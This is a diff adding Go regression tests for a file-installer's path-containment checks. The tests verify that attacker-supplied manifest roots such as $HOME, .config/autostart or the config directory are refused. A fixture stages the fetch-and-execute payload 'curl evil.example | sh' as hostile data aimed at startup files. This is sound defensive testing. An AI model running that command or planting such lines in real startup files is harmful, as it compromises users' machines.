@@ -819,3 +819,191 @@ func TestInstallRefusesPackEntryEvenWithHostileStatusMap(t *testing.T) {
 		t.Errorf("%s must not have been created: lstat err = %v", target, err)
 	}
 }
+
+// --- Ruling R-P3-B1d: a CatRepo/CatWorktree entry must lie under one of
+// the manifest's declared Roots, and each Root must itself pass
+// validRoot's containment (under Home, not Home itself, outside
+// ConfigDir/DataDir, no dot-prefixed first component) and be fresh
+// (absent, or containing only this manifest's own entries). B1c disclosed
+// this as the residual gap left open after CatPack was closed — these are
+// its regression tests. ---
+
+// rootPoCFixture builds a one-entry CatWorktree manifest declaring root as
+// its sole Manifest.Roots entry, with dstRel joined under root as the
+// entry's Dst, and stages attacker-controlled bytes under its id. Mirrors
+// the PoC style used above for CatPack/CatCapture.
+func rootPoCFixture(t *testing.T, home, root, dstRel string) (*Manifest, string, session.Paths, string) {
+	t.Helper()
+	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
+	p := session.Paths{
+		Home:       home,
+		ConfigDir:  filepath.Join(home, ".claude"),
+		GlobalJSON: filepath.Join(home, ".claude.json"),
+		DataDir:    dataDir,
+	}
+	jobID := "77777777-7777-4777-8777-777777777777"
+	staging := job.StagingDir(dataDir, jobID)
+	dst := filepath.Join(root, dstRel)
+	payload := "curl evil.example | sh\n"
+
+	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid, Roots: []string{root}}
+	m.Entries = []Entry{{
+		ID: 0, Category: session.CatWorktree, Dst: dst,
+		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload),
+	}}
+	writeFile(t, StagedPath(staging, 0), payload)
+	return m, staging, p, dst
+}
+
+// runRootPoC drives Diff+Install for a rootPoCFixture and asserts the
+// entry was refused and never created at Dst.
+func runRootPoC(t *testing.T, m *Manifest, staging string, p session.Paths, dst string) {
+	t.Helper()
+	st, err := Diff(context.Background(), m, staging)
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
+	if err == nil || !strings.Contains(err.Error(), dst) {
+		t.Fatalf("err = %v, want a refusal naming %s", err, dst)
+	}
+	if _, err := os.Lstat(dst); !os.IsNotExist(err) {
+		t.Errorf("%s must not have been created: lstat err = %v", dst, err)
+	}
+}
+
+// TestInstallRefusesWorktreeRootIsHomeItself: a worktree entry with
+// Root=$HOME and Dst=$HOME/.bash_profile must be refused, and nothing
+// created — a Root that IS Home would let a CatWorktree/CatRepo entry
+// land literally anywhere under Home.
+func TestInstallRefusesWorktreeRootIsHomeItself(t *testing.T) {
+	home := t.TempDir()
+	m, staging, p, dst := rootPoCFixture(t, home, home, ".bash_profile")
+	runRootPoC(t, m, staging, p, dst)
+}
+
+// TestInstallRefusesWorktreeRootDotPrefixed: Root=$HOME/.config/autostart
+// must be refused — its first path component under Home (".config") is
+// dot-prefixed, exactly the shape of the config dirs/dotfiles a shell or
+// login manager reads.
+func TestInstallRefusesWorktreeRootDotPrefixed(t *testing.T) {
+	home := t.TempDir()
+	root := filepath.Join(home, ".config", "autostart")
+	m, staging, p, dst := rootPoCFixture(t, home, root, "evil.desktop")
+	runRootPoC(t, m, staging, p, dst)
+}
+
+// TestInstallRefusesWorktreeRootUnderConfigDir: Root=$HOME/.claude (the
+// default ConfigDir) must be refused — CatSession already owns that
+// space, with its own Forbidden-path checks; a git root must never
+// overlap it.
+func TestInstallRefusesWorktreeRootUnderConfigDir(t *testing.T) {
+	home := t.TempDir()
+	root := filepath.Join(home, ".claude")
+	m, staging, p, dst := rootPoCFixture(t, home, root, "evil.json")
+	runRootPoC(t, m, staging, p, dst)
+}
+
+// TestInstallRefusesWorktreeRootWithForeignContent: an otherwise-valid
+// Root (under Home, not dot-prefixed, outside ConfigDir/DataDir) that
+// already exists and already holds a file the manifest knows nothing
+// about must be refused before anything is written, and that pre-existing
+// file must survive untouched — a hostile source could otherwise claim
+// any of the user's real directories as a Root and smuggle a new file
+// into it.
+func TestInstallRefusesWorktreeRootWithForeignContent(t *testing.T) {
+	home := t.TempDir()
+	root := filepath.Join(home, "existing-project")
+	if err := os.MkdirAll(root, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	real := filepath.Join(root, "realfile.txt")
+	if err := os.WriteFile(real, []byte("the user's own file\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	m, staging, p, dst := rootPoCFixture(t, home, root, "newfile.txt")
+
+	st, err := Diff(context.Background(), m, staging)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st[0] != PresentDifferent {
+		t.Errorf("status = %s, want %s (root has foreign content)", st[0], PresentDifferent)
+	}
+	runRootPoC(t, m, staging, p, dst)
+	got, err := os.ReadFile(real)
+	if err != nil || string(got) != "the user's own file\n" {
+		t.Errorf("%s must survive untouched: got %q err=%v", real, got, err)
+	}
+}
+
+// TestInstallInstallsCatWorktreeEntryUnderFreshValidRoot proves the fix
+// does not break the legitimate case: a CatWorktree entry under a
+// declared Root that is absent (fresh-main's whole premise) installs
+// normally.
+func TestInstallInstallsCatWorktreeEntryUnderFreshValidRoot(t *testing.T) {
+	home := t.TempDir()
+	root := filepath.Join(home, "github", "proj")
+	m, staging, p, dst := rootPoCFixture(t, home, root, "src.go")
+
+	st, err := Diff(context.Background(), m, staging)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st[0] != StagedSame {
+		t.Fatalf("status = %s, want %s", st[0], StagedSame)
+	}
+	rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
+	if err != nil {
+		t.Fatalf("Install: %v", err)
+	}
+	if rep.Installed != 1 {
+		t.Errorf("report = %+v, want Installed 1", rep)
+	}
+	if _, err := os.Stat(dst); err != nil {
+		t.Errorf("%s not installed: %v", dst, err)
+	}
+}
+
+// TestDiffTreatsAlreadyPlacedCatWorktreeEntriesAsFreshRoot pins the design
+// decision behind rootForeignContent (a subset check — "does everything
+// under root belong to this manifest's own entries", not a bare "root
+// must be empty" check): once entries have been legitimately placed under
+// a Root, a LATER Diff call (verifyInstall's own re-Diff after a
+// successful install, or a resumed job after a crash) must still see the
+// root as fresh. A naive "root must be absent or empty" check would
+// instead refuse this manifest's own second entry the moment the first
+// one landed, breaking every multi-file fresh-main/not-a-repo teleport's
+// own verify step — not just a crash-retry edge case.
+func TestDiffTreatsAlreadyPlacedCatWorktreeEntriesAsFreshRoot(t *testing.T) {
+	home := t.TempDir()
+	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
+	root := filepath.Join(home, "github", "proj")
+	jobID := "88888888-8888-4888-8888-888888888888"
+	staging := job.StagingDir(dataDir, jobID)
+	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid, Roots: []string{root}}
+	m.Entries = []Entry{
+		{ID: 0, Category: session.CatWorktree, Dst: filepath.Join(root, "a.go"), Size: 5, Mode: 0o600, SHA256: sha("aaaaa")},
+		{ID: 1, Category: session.CatWorktree, Dst: filepath.Join(root, "b.go"), Size: 5, Mode: 0o600, SHA256: sha("bbbbb")},
+	}
+	// Entry 0 already landed, an earlier successful pass: a real file at
+	// its Dst, matching content.
+	if err := os.MkdirAll(root, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(m.Entries[0].Dst, []byte("aaaaa"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	writeFile(t, StagedPath(staging, 1), "bbbbb")
+
+	st, err := Diff(context.Background(), m, staging)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st[0] != PresentSame {
+		t.Errorf("entry 0 (already placed) = %s, want %s", st[0], PresentSame)
+	}
+	if st[1] != StagedSame {
+		t.Errorf("entry 1 (not yet placed, same root) = %s, want %s", st[1], StagedSame)
+	}
+}
